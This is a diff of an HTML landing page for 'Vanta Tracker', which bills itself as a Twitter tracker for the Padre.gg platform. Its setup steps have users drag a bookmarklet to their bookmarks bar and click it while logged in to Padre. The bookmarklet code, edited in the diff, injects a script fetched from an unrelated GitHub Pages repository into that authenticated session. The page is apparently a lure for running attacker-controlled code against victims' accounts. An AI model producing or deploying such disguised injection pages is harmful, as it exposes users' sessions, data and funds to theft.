@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
     <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    
     <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
     <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
     <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
@@ -47,6 +48,7 @@
             display: inline-block; background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px;
             font-weight: 700; margin: 12px; transition: 0.3s; box-shadow: 0 6px 20px rgba(0,255,136,0.4);
+            cursor: grab;
         }
         .cta-button:hover { transform: translateY(-5px); box-shadow: 0 12px 30px rgba(0,255,136,0.6); }
 
@@ -99,17 +101,17 @@
     <section id="setup" class="setup-section">
         <h2>Setup Guide</h2>
         <ol>
-            <li>Drag the button below to your Bookmarks Bar.</li>
-            <li>Open Padre.gg and log in.</li>
-            <li>Click the "Vanta Tracker" bookmark to activate.</li>
+            <li>Drag the "Vanta Tracker" button below to your <strong>Bookmarks Bar</strong>.</li>
+            <li>Go to <strong>Padre.gg</strong> and make sure you are logged in.</li>
+            <li>Click the bookmark while on the Padre site to synchronize.</li>
         </ol>
         <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
     </section>
 
-    <footer><p>© 2025 Vanta Tracker. Optimized for Padre.</p></footer>
+    <footer><p>© 2026 Vanta Tracker. Optimized for Padre.</p></footer>
 
     <script>
-        // WebGL Background
+        // --- WebGL Background Animation ---
         const canvas = document.getElementById('filamentCanvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
@@ -139,11 +141,18 @@
         }
         animate();
 
-        // THE BOOKMARKLET LOGIC
-        // This ensures the button loads YOUR script from GitHub
+        // --- BOOKMARKLET GENERATOR ---
+        // This generates the code that will be injected into Padre.gg
         const scriptUrl = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
-        const code = `javascript:(function(){var s=document.createElement('script');s.src='${scriptUrl}?v='+Math.random();document.body.appendChild(s);})();`;
-        document.getElementById('vanta-tool').href = code;
+        
+        // Cache-busting ensures the user always downloads your latest tracker.js from GitHub
+        const bookmarkletCode = `javascript:(function(){
+            var s=document.createElement('script');
+            s.src='${scriptUrl}?v='+Date.now();
+            document.body.appendChild(s);
+        })();`.replace(/\s+/g, ' '); // Minify slightly for compatibility
+
+        document.getElementById('vanta-tool').href = bookmarkletCode;
     </script>
 </body>
 </html>
